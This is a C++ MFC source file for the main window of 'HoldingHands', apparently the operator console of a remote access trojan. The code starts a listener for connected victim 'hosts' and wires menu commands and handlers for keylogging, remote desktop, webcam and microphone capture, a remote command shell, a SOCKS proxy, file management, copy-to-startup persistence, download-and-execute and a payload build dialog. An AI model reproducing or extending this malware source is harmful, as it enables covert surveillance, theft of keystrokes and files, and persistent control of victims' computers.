
// MainFrm.cpp : CMainFrame 类的实现
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "MainFrm.h"
#include "BuildDlg.h"
#include "SettingDlg.h"
#include "utils.h"

#include "Server.h"
#include "Client.h"
#include "IOCP.h"

//other windows...
#include "FileTransDlg.h"
#include "FileDownloadDlg.h"
#include "FileManagerDlg.h"
#include "RemoteDesktopWnd.h"
#include "CmdWnd.h"
#include "CameraWnd.h"
#include "AudioDlg.h"
#include "KeybdLogDlg.h"
#include "SocksProxyWnd.h"
#include "FileMgrSearchDlg.h"
#include "ChatDlg.h"
#include "ProcessManagerWnd.h"

//handlers.
#include "KernelSrv.h"
#include "FileDownloadSrv.h"
#include "FileTransSrv.h"
#include "FileManagerSrv.h"
#include "KeybdLogSrv.h"
#include "RemoteDesktopSrv.h"
#include "SocksProxySrv.h"
#include "AudioSrv.h"
#include "CameraSrv.h"
#include "ChatSrv.h"
#include "FileMgrSearchSrv.h"
#include "ProcessManagerSrv.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CMainFrame

IMPLEMENT_DYNAMIC(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_SETFOCUS()
	ON_WM_PAINT()


	//
	ON_WM_TIMER()
	ON_COMMAND(ID_MAIN_STARTSERVER, &CMainFrame::OnMainStartserver)
	ON_UPDATE_COMMAND_UI(ID_MAIN_STARTSERVER, &CMainFrame::OnUpdateMainStartserver)

	//创建Handler对象
	ON_MESSAGE(WM_CLIENT_LOGIN,OnClientLogin)

	//ON_MESSAGE()
	ON_WM_CLOSE()
	ON_COMMAND(ID_MAIN_EXIT, &CMainFrame::OnMainExit)
	//不在MainFrame里面加始终是灰色的.
	ON_COMMAND(ID_SESSION_DISCONNECT, &CMainFrame::OnSessionDisconnect)
	ON_COMMAND(ID_SESSION_UNINSTALL, &CMainFrame::OnSessionUninstall)
	ON_COMMAND(ID_POWER_SHUTDOWN, &CMainFrame::OnPowerShutdown)
	ON_COMMAND(ID_POWER_REBOOT, &CMainFrame::OnPowerReboot)
	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CMainFrame::OnOperationEditcomment)
	ON_UPDATE_COMMAND_UI(ID_MAIN_EXIT, &CMainFrame::OnUpdateMainExit)
	ON_COMMAND(ID_OPERATION_CMD, &CMainFrame::OnOperationCmd)
	ON_COMMAND(ID_OPERATION_CHATBOX, &CMainFrame::OnOperationChatbox)
	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CMainFrame::OnOperationFilemanager)
	ON_COMMAND(ID_OPERATION_REMOTEDESKTOP, &CMainFrame::OnOperationRemotedesktop)
	ON_COMMAND(ID_OPERATION_CAMERA, &CMainFrame::OnOperationCamera)
	ON_COMMAND(ID_SESSION_RESTART, &CMainFrame::OnSessionRestart)
	ON_COMMAND(ID_OPERATION_MICROPHONE, &CMainFrame::OnOperationMicrophone)
	ON_COMMAND(ID_MAIN_BUILD, &CMainFrame::OnMainBuild)
	ON_COMMAND(ID_MAIN_SETTINGS, &CMainFrame::OnMainSettings)
	ON_COMMAND(ID_OPERATION_KEYBOARD, &CMainFrame::OnOperationKeyboard)
	ON_COMMAND(ID_UTILS_ADDTO, &CMainFrame::OnUtilsAddto)
	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CMainFrame::OnUtilsCopytostartup)
	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CMainFrame::OnUtilsDownloadandexec)
	ON_COMMAND(ID_PROXY_SOCKSPROXY, &CMainFrame::OnProxySocksproxy)
	ON_COMMAND(ID_SESSION_EXIT, &CMainFrame::OnSessionExit)
	ON_COMMAND(ID_UTILS_OPENWEBPAGE, &CMainFrame::OnUtilsOpenwebpage)
	ON_WM_SIZE()
	ON_COMMAND(ID_OPERATION_PROCESSMANAGER, &CMainFrame::OnOperationProcessmanager)
END_MESSAGE_MAP()

TCHAR * szSrvStatu[] =
{
	TEXT("Starting"),
	TEXT("Running"),
	TEXT("Stopping"),
	TEXT("Stopped"),
};


static UINT indicators[] =
{
	ID_SERVER_STATU,
	ID_HOST_COUNT,
	ID_HOST_SELECTED,
	ID_UPLOAD_SPEED,
	ID_DOWNLOAD_SPEED,
	ID_CUR_DATE
};

// CMainFrame 构造/析构

CMainFrame::CMainFrame(CIOCP *Iocp)
{
	TCHAR szPath[MAX_PATH];

	m_View = 0;
	m_pServer = NULL;
	m_listenPort = 10086;
	//

	m_pServer = NULL;
	m_Iocp = Iocp;
	//
	GetProcessDirectory(szPath);

	CString strPath(szPath);
	strPath += TEXT("\\config\\config.json");

	if (!m_config.LoadConfig(strPath))
	{
		m_config.DefaultConfig();
	}
}

CMainFrame::~CMainFrame()
{
	TCHAR szPath[MAX_PATH];

	//release server.
	if (m_pServer)
	{
		m_pServer->Close();
		m_pServer->Put();
		m_pServer = NULL;
	}

	GetProcessDirectory(szPath);
	StrCat(szPath, TEXT("\\config\\config.json"));
	m_config.SaveConfig(szPath);
}

/*
	lan broadcast IP Address..


*/
//
//UINT AFX_CDECL Broadcast(LPVOID  Arg[]){
//	CString * lan_ip_address =		(CString*)Arg[0];
//	CString * broadcast_address =   (CString*)Arg[1];
//
//	SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
//
//	SOCKADDR_IN addr = { 0 };
//	addr.sin_addr.S_un.S_addr = INADDR_ANY;
//	addr.sin_family = AF_INET;
//	addr.sin_port = htons(12345);
//
//
//	if (bind(s, (SOCKADDR*)&addr, sizeof(addr))){
//		AfxMessageBox(TEXT("Broadcast Bind failed"));
//		return -1;
//	}
//
//	while (1){
//		char pkt[0x100] = { 0 };
//		SOCKADDR_IN target_addr = { 0 };
//		target_addr.sin_family = AF_INET;
//		target_addr.sin_addr.S_un.S_addr = inet_addr(broadcast_address);
//		target_addr.sin_port = htons(55512);
//		
//		
//		memcpy(pkt, "BINSONG", 7);
//		sprintf(pkt, "BINSONG-%s", lan_ip_address);
//
//		sendto(s, pkt, strlen(pkt) + 1, 0, (SOCKADDR*)&target_addr, sizeof(target_addr));
//
//		Sleep(2000);
//	}
//	return 0;
//}


int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	RECT rect = { 0 };

	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	//创建状态栏
	if (!m_wndStatusBar.Create(this)){
		TRACE0("未能创建StatuBar\n");
		return -1;      // 未能创建
	}
	m_wndStatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT));
	m_wndStatusBar.SetPaneInfo(0, ID_SERVER_STATU, SBPS_STRETCH, 0);
	m_wndStatusBar.SetPaneInfo(1, ID_HOST_COUNT, SBPS_NORMAL, 110);
	m_wndStatusBar.SetPaneInfo(2, ID_HOST_SELECTED, SBPS_NORMAL, 110);
	m_wndStatusBar.SetPaneInfo(3, ID_UPLOAD_SPEED, SBPS_NORMAL, 180);
	m_wndStatusBar.SetPaneInfo(4, ID_DOWNLOAD_SPEED, SBPS_NORMAL, 180);
	m_wndStatusBar.SetPaneInfo(5, ID_CUR_DATE, SBPS_NORMAL, 160);

	if (!m_ClientList.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT,
		rect, this, NULL))
	{
		TRACE0("未能创建ClientList\n");
		return -1;      // 未能创建
	}

	m_View |= (VIEW_SHOW_CLIENLIST);
	m_ServerStatu = SRV_STATU_STOPPED;

	//用于刷新数据的计时器
	SetTimer(10086, 1000, NULL);
	//
	SetIcon(AfxGetApp()->LoadIcon(IDR_MAINFRAME),TRUE);
	SetIcon(AfxGetApp()->LoadIcon(IDR_MAINFRAME), TRUE);

	CenterWindow(CWnd::GetDesktopWindow());

	/*
	LPVOID * Args = new LPVOID [2];

	Args[0] = new CString(m_config.GetConfig(TEXT("lan"), TEXT("address")));
	Args[1] = new CString(m_config.GetConfig(TEXT("lan"), TEXT("broadcast")));

	AfxBeginThread(Broadcast, (LPVOID)Args);*/
	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO:  在此处通过修改
	//  CREATESTRUCT cs 来修改窗口类或样式

	cs.style |= (CS_HREDRAW | CS_VREDRAW);
	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.lpszClass = AfxRegisterWndClass(0);
	cs.lpszName = TEXT("[HoldingHands]");
	
	return TRUE;
}

// CMainFrame 诊断

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG


// CMainFrame 消息处理程序

void CMainFrame::OnSetFocus(CWnd* /*pOldWnd*/)
{
	
}

void CMainFrame::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO:  在此处添加消息处理程序代码
	// 不为绘图消息调用 CFrameWnd::OnPaint()
	
}


void CMainFrame::OnUpdateStatuBar()
{
	//更新时间
	CString PaneText;
	CTime time = CTime::GetTickCount();
	LARGE_INTEGER traffic[2];
	LARGE_INTEGER tmp[2];
	static LARGE_INTEGER last_traffic[2] = { 0 };

	TCHAR szReadSpeed[128], szWriteSpeed[128];

	PaneText = time.Format("[%Y-%m-%d %H:%M:%S]");
	m_wndStatusBar.SetPaneText(5, PaneText);
	//更新上传,下载速度.

	m_Iocp->GetTraffic((ULONGLONG*)traffic);
	memcpy(tmp, traffic, sizeof(traffic));
	
	//
	traffic[0].QuadPart -= last_traffic[0].QuadPart;
	traffic[1].QuadPart -= last_traffic[1].QuadPart;

	//update traffic.
	memcpy(last_traffic, tmp, sizeof(tmp));

	GetStorageSizeString(traffic[0], szReadSpeed);
	GetStorageSizeString(traffic[1], szWriteSpeed);

	PaneText.Format(TEXT("Upload: %s/S"), szWriteSpeed);
	m_wndStatusBar.SetPaneText(3, PaneText);

	PaneText.Format(TEXT("Download: %s/s"), szReadSpeed);
	m_wndStatusBar.SetPaneText(4, PaneText);

	//HostCount
	PaneText.Format(TEXT("Host: %d"), m_ClientList.GetItemCount());
	m_wndStatusBar.SetPaneText(1, PaneText);
	//Selected Count
	PaneText.Format(TEXT("Selected: %d"), m_ClientList.GetSelectedCount());
	m_wndStatusBar.SetPaneText(2, PaneText);
	//ServerStatu

	PaneText.Format(TEXT("ServerStatu: %s"), szSrvStatu[m_ServerStatu]);
	m_wndStatusBar.SetPaneText(0, PaneText);
}
void CMainFrame::OnTimer(UINT_PTR nIDEvent)
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	//
	switch (nIDEvent)
	{
	case 10086:
		OnUpdateStatuBar();
		break;
	default:
		break;
	}
	CFrameWnd::OnTimer(nIDEvent);
}

/*
	add multiple listener ? 
*/

void CMainFrame::OnMainStartserver()
{
	// TODO:  在此添加命令处理程序代码
	if (m_ServerStatu == SRV_STATU_STARTED){
		if (m_pServer)
		{
			m_pServer->Close();
			m_pServer->Put();
			m_pServer = NULL;
		}
		m_ServerStatu = SRV_STATU_STOPPED;

		//移除所有客户端
		//m_ClientList.DeleteAllItems();
		return;
	}

	if (m_ServerStatu == SRV_STATU_STOPPED)
	{
		m_ServerStatu = SRV_STATU_STARTING;
		m_pServer = new CServer;

		if (!m_pServer->Create())
		{
			MessageBox(TEXT("Create Server failed"), TEXT("Error"), MB_OK);
			m_pServer->Close();
			m_pServer->Put();
			m_pServer = NULL;
			return;
		}

		if (!m_pServer->Bind(10086, "0.0.0.0"))
		{
			MessageBox(TEXT("Bind failed"), TEXT("Error"), MB_OK);
			m_pServer->Close();
			m_pServer->Put();
			m_pServer = NULL;
			return;
		}

		if (!m_pServer->Listen(1024))
		{
			MessageBox(TEXT("Listen failed"), TEXT("Error"), MB_OK);
			m_pServer->Close();
			m_pServer->Put();
			m_pServer = NULL;
			return;
		}
		
		if (!m_Iocp->AssociateSock(m_pServer))
		{
			MessageBox(TEXT("AssociateSock failed"), TEXT("Error"), MB_OK);
			m_pServer->Close();
			m_pServer->Put();
			m_pServer = NULL;
			return;
		}

		//begin accept.
		m_pServer->SetNotifyWindow(m_hWnd);
		m_pServer->Accept(NULL);

		m_ServerStatu = SRV_STATU_STARTED;
		MessageBox(TEXT("Start server successed!"), TEXT("Tips"),MB_OK);
	}
}


void CMainFrame::OnUpdateMainStartserver(CCmdUI *pCmdUI)
{
	// TODO:  在此添加命令更新用户界面处理程序代码
	switch (m_ServerStatu)
	{
	case SRV_STATU_STARTED:
		pCmdUI->SetText(TEXT("Stop"));
		pCmdUI->Enable(TRUE);
		break;
	case SRV_STATU_STARTING:
		pCmdUI->SetText(TEXT("Starting"));
		pCmdUI->Enable(FALSE);
		break;
	case SRV_STATU_STOPPED:
		pCmdUI->SetText(TEXT("Start"));
		pCmdUI->Enable(TRUE);
		break;
	case SRV_STATU_STOPPING:
		pCmdUI->SetText(TEXT("Stopping"));
		pCmdUI->Enable(FALSE);
		break;
	}
}

void CMainFrame::OnMainExit()
{
	// TODO:  在此添加命令处理程序代码
	CMainFrame::OnClose();
}

void CMainFrame::OnClose()
{
	if (IDYES != MessageBox(
		TEXT("Are you sure?"), 
		TEXT("Exit"),
		MB_YESNO|MB_ICONQUESTION))
		return;

	if (m_pServer)
	{
		m_pServer->Close();
		m_pServer->Put();
		m_pServer = NULL;
	}
	
	KillTimer(10086);
	m_ServerStatu = SRV_STATU_STOPPED;

	CFrameWnd::OnClose();
}


LRESULT CMainFrame::OnClientLogin(WPARAM wParam, LPARAM module)
{
	CEventHandler*pHandler = (CEventHandler*)wParam;
	CWnd * pWnd = NULL;

	switch (module)
	{
	case KNEL:
		pHandler->SetNotifyWindow(m_ClientList.GetSafeHwnd());
		pHandler->Get();
		break;
	case MINIFILETRANS:
		{
			CFileTransDlg * pDlg = new CFileTransDlg((CFileTransSrv*)pHandler);
			pDlg->Create(IDD_FILETRANS, CWnd::GetDesktopWindow());
			pDlg->ShowWindow(SW_NORMAL);
		}
		break;
	case MINIDOWNLOAD:
		{
			CFileDownloadDlg * pDlg = new CFileDownloadDlg((CFileDownloadSrv*)pHandler);
			pDlg->Create(IDD_MNDD_DLG, CWnd::GetDesktopWindow());
			pDlg->ShowWindow(SW_NORMAL);
		}
		break;
	case CMD:
		{
			CCmdWnd * pWnd = new CCmdWnd((CCmdSrv*)pHandler);
			pWnd->Create(NULL, NULL, WS_OVERLAPPEDWINDOW);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case CHAT:
		{
			CChatDlg * pWnd = new CChatDlg((CChatSrv*)pHandler);
			pWnd->Create(IDD_CHAT_DLG, CWnd::GetDesktopWindow());
		}
		break;
	case FILE_MANAGER:
		{
			CFileManagerDlg * pWnd = new CFileManagerDlg((CFileManagerSrv*)pHandler);
			pWnd->Create(IDD_FM_DLG, CWnd::GetDesktopWindow());
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case FILEMGR_SEARCH:
		{
			CFileMgrSearchDlg * pWnd = new CFileMgrSearchDlg((CFileMgrSearchSrv*)pHandler);
			pWnd->Create(IDD_FM_SEARCH_DLG, CWnd::GetDesktopWindow());
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case REMOTEDESKTOP:
		{
			CRemoteDesktopWnd * pWnd = new CRemoteDesktopWnd((CRemoteDesktopSrv*)pHandler);
			pWnd->Create(NULL, NULL);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case CAMERA:
		{
			CCameraWnd * pWnd = new CCameraWnd((CCameraSrv*)pHandler);
			pWnd->Create(NULL,NULL);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case AUDIO:
		{
			CAudioDlg * pWnd = new CAudioDlg((CAudioSrv*)pHandler);
			pWnd->Create(IDD_AUDIODLG, CWnd::GetDesktopWindow());
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case KBLG:
		{
			CKeybdLogDlg * pWnd = new CKeybdLogDlg((CKeybdLogSrv*)pHandler);
			pWnd->Create(IDD_KBD_LOG, CWnd::GetDesktopWindow());
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case SOCKS_PROXY:
		{
			CSocksProxyWnd * pWnd = new CSocksProxyWnd((CSocksProxySrv*)pHandler);
			pWnd->Create(NULL, NULL);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case PROCESS_MANAGER:
		{
			CProcessManagerWnd* pWnd = new CProcessManagerWnd((CProcessManagerSrv*)pHandler);
			pWnd->Create(NULL,NULL);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	}
	return 0;
}


//不在MainFrame里面加消息映射,菜单始终是灰色的mmp.
void CMainFrame::OnSessionDisconnect()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_SESSION_DISCONNECT);
}
void CMainFrame::OnSessionUninstall()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_SESSION_UNINSTALL);
}
void CMainFrame::OnPowerShutdown()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_POWER_SHUTDOWN);
}
void CMainFrame::OnPowerReboot()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_POWER_REBOOT);
}
void CMainFrame::OnOperationEditcomment()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_EDITCOMMENT);
}

void CMainFrame::OnUpdateMainExit(CCmdUI *pCmdUI)
{
	// TODO:  在此添加命令更新用户界面处理程序代码
	pCmdUI->Enable(!(m_ServerStatu == SRV_STATU_STOPPING));
}


void CMainFrame::OnOperationCmd()
{
	// TODO:  在此添加命令处理程序代码
	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_CMD);
}


void CMainFrame::OnOperationChatbox()
{
	// TODO:  在此添加命令处理程序代码
	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_CHATBOX);
}

void CMainFrame::OnOperationFilemanager()
{
	// TODO:  在此添加命令处理程序代码
	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_FILEMANAGER);
}


void CMainFrame::OnOperationRemotedesktop()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_REMOTEDESKTOP);
}


void CMainFrame::OnOperationCamera()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_CAMERA);
}


void CMainFrame::OnSessionRestart()
{
	// TODO:  在此添加命令处理程序代码
	m_ClientList.SendMessage(WM_COMMAND, ID_SESSION_RESTART);
}


void CMainFrame::OnOperationMicrophone()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_MICROPHONE);
}



void CMainFrame::OnMainBuild(){
	CBuildDlg dlg;
	dlg.DoModal();
}


void CMainFrame::OnMainSettings(){
	CSettingDlg dlg(m_config,this);
	dlg.DoModal();
}


void CMainFrame::OnOperationKeyboard()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_KEYBOARD, 0);
}


void CMainFrame::OnUtilsAddto()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_UTILS_ADDTO, 0);
}


void CMainFrame::OnUtilsCopytostartup()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_UTILS_COPYTOSTARTUP, 0);
}


void CMainFrame::OnUtilsDownloadandexec()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_UTILS_DOWNLOADANDEXEC, 0);
}


void CMainFrame::OnProxySocksproxy()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_PROXY_SOCKSPROXY, 0);
}


void CMainFrame::OnSessionExit()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_SESSION_EXIT, 0);
}


void CMainFrame::OnUtilsOpenwebpage()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_UTILS_OPENWEBPAGE, 0);
}


void CMainFrame::OnSize(UINT nType, int cx, int cy)
{
	CFrameWnd::OnSize(nType, cx, cy);

	RECT rect;
	RECT StatuBarRect;
	//
	m_wndStatusBar.GetClientRect(&StatuBarRect);
	GetClientRect(&rect);
	rect.bottom -= (StatuBarRect.bottom - StatuBarRect.top);
	m_ClientList.MoveWindow(&rect);
	m_ClientList.ShowWindow(SW_SHOW);
	// TODO:  在此处添加消息处理程序代码
}



void CMainFrame::OnOperationProcessmanager()
{
	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_PROCESSMANAGER);
}
